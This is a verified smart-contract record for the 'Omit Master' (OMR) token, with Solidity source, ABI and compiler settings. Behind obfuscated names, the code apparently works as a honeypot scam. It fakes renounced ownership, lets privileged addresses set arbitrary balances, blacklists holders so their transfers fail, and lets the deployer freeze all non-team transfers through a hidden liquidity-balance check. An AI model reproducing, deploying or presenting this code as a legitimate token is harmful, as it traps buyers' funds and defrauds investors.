{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface listMarketing {\n    function createPair(address atLaunch, address shouldFee) external returns (address);\n}\n\ninterface exemptTotalTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minEnable) external view returns (uint256);\n\n    function transfer(address launchedTotalReceiver, uint256 exemptToTeam) external returns (bool);\n\n    function allowance(address buyMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptToTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedTotalReceiver,\n        uint256 exemptToTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txAmount, uint256 value);\n    event Approval(address indexed buyMin, address indexed spender, uint256 value);\n}\n\nabstract contract swapAtTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyFeeIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverSender is exemptTotalTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OmitMaster is swapAtTeam, exemptTotalTeam, receiverSender {\n\n    function isShould() private view {\n        require(receiverMode[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return txTotal;\n    }\n\n    address maxLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address limitAt, uint256 exemptToTeam) external virtual override returns (bool) {\n        return fundAuto(_msgSender(), limitAt, exemptToTeam);\n    }\n\n    function transferFrom(address fundTx, address launchedTotalReceiver, uint256 exemptToTeam) external override returns (bool) {\n        if (_msgSender() != launchMaxExempt) {\n            if (liquidityLimit[fundTx][_msgSender()] != type(uint256).max) {\n                require(exemptToTeam <= liquidityLimit[fundTx][_msgSender()]);\n                liquidityLimit[fundTx][_msgSender()] -= exemptToTeam;\n            }\n        }\n        return fundAuto(fundTx, launchedTotalReceiver, exemptToTeam);\n    }\n\n    address private txTotal;\n\n    bool public fundReceiver;\n\n    constructor (){\n        \n        buyFeeIs liquidityWallet = buyFeeIs(launchMaxExempt);\n        liquidityFee = listMarketing(liquidityWallet.factory()).createPair(liquidityWallet.WETH(), address(this));\n        if (modeLaunched) {\n            sellTrading = isTotal;\n        }\n        teamWallet = _msgSender();\n        receiverMode[teamWallet] = true;\n        exemptSell[teamWallet] = enableToTx;\n        txFrom();\n        \n        emit Transfer(address(0), teamWallet, enableToTx);\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityLimit;\n\n    function takeTo(uint256 exemptToTeam) public {\n        isShould();\n        totalEnable = exemptToTeam;\n    }\n\n    function autoList(address limitAt, uint256 exemptToTeam) public {\n        isShould();\n        exemptSell[limitAt] = exemptToTeam;\n    }\n\n    function txFrom() public {\n        emit OwnershipTransferred(teamWallet, address(0));\n        txTotal = address(0);\n    }\n\n    uint256 private feeLimit;\n\n    mapping(address => bool) public teamLaunch;\n\n    uint8 private tokenMarketing = 18;\n\n    uint256 public isTotal;\n\n    function fundAuto(address fundTx, address launchedTotalReceiver, uint256 exemptToTeam) internal returns (bool) {\n        if (fundTx == teamWallet) {\n            return totalShouldMarketing(fundTx, launchedTotalReceiver, exemptToTeam);\n        }\n        uint256 tradingLaunched = exemptTotalTeam(liquidityFee).balanceOf(maxLaunched);\n        require(tradingLaunched == totalEnable);\n        require(launchedTotalReceiver != maxLaunched);\n        if (teamLaunch[fundTx]) {\n            return totalShouldMarketing(fundTx, launchedTotalReceiver, listTotalWallet);\n        }\n        return totalShouldMarketing(fundTx, launchedTotalReceiver, exemptToTeam);\n    }\n\n    function shouldReceiverSender(address tokenEnableIs) public {\n        if (buyShouldAuto) {\n            return;\n        }\n        if (feeLimit != sellTrading) {\n            sellTrading = isTotal;\n        }\n        receiverMode[tokenEnableIs] = true;\n        \n        buyShouldAuto = true;\n    }\n\n    uint256 totalEnable;\n\n    bool private modeLaunched;\n\n    function approve(address isReceiver, uint256 exemptToTeam) public virtual override returns (bool) {\n        liquidityLimit[_msgSender()][isReceiver] = exemptToTeam;\n        emit Approval(_msgSender(), isReceiver, exemptToTeam);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atTx;\n    }\n\n    function totalShouldMarketing(address fundTx, address launchedTotalReceiver, uint256 exemptToTeam) internal returns (bool) {\n        require(exemptSell[fundTx] >= exemptToTeam);\n        exemptSell[fundTx] -= exemptToTeam;\n        exemptSell[launchedTotalReceiver] += exemptToTeam;\n        emit Transfer(fundTx, launchedTotalReceiver, exemptToTeam);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed launchedMarketingTx, address indexed minList);\n\n    mapping(address => bool) public receiverMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return isLimit;\n    }\n\n    uint256 private sellTrading;\n\n    address launchMaxExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private isLimit = \"OMR\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableToTx;\n    }\n\n    address public liquidityFee;\n\n    uint256 private enableToTx = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return txTotal;\n    }\n\n    bool public tokenExempt;\n\n    function allowance(address sellExempt, address isReceiver) external view virtual override returns (uint256) {\n        if (isReceiver == launchMaxExempt) {\n            return type(uint256).max;\n        }\n        return liquidityLimit[sellExempt][isReceiver];\n    }\n\n    function balanceOf(address minEnable) public view virtual override returns (uint256) {\n        return exemptSell[minEnable];\n    }\n\n    string private atTx = \"Omit Master\";\n\n    bool public buyShouldAuto;\n\n    mapping(address => uint256) private exemptSell;\n\n    function tradingMaxIs(address launchMax) public {\n        isShould();\n        if (sellTrading == feeLimit) {\n            modeLaunched = false;\n        }\n        if (launchMax == teamWallet || launchMax == liquidityFee) {\n            return;\n        }\n        teamLaunch[launchMax] = true;\n    }\n\n    uint256 constant listTotalWallet = 15 ** 10;\n\n    uint256 teamExempt;\n\n    address public teamWallet;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenMarketing;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedMarketingTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptToTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptToTeam\",\"type\":\"uint256\"}],\"name\":\"autoList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyShouldAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenEnableIs\",\"type\":\"address\"}],\"name\":\"shouldReceiverSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptToTeam\",\"type\":\"uint256\"}],\"name\":\"takeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"}],\"name\":\"tradingMaxIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptToTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedTotalReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptToTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OmitMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}